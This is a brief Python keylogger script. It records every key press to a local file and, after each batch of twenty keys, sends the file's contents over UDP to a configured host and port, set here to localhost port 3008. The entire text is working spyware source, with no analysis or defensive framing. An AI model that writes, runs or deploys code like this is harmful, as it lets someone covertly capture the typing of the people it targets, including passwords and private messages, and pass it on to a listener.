import keyboard
import socket

host = '127.0.0.1'  
port = 3008        
logs = 0
log_file = 'keystrokes.txt'

def keypress(event):
    global logs
    print("key pressed")
    with open(log_file, 'a') as f:
        f.write('{}\n'.format(str(event.name)))  
    logs += 1
    print("number of logs:", logs)

    if logs == 20:
        print("sending logs...")
        with open(log_file, 'rb') as f:  
            data = f.read()
        client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        client.sendto(data, (host, port)) 
        logs = 0
        print("logs sent")

keyboard.on_press(keypress)
print("listening for keystrokes...")
keyboard.wait()
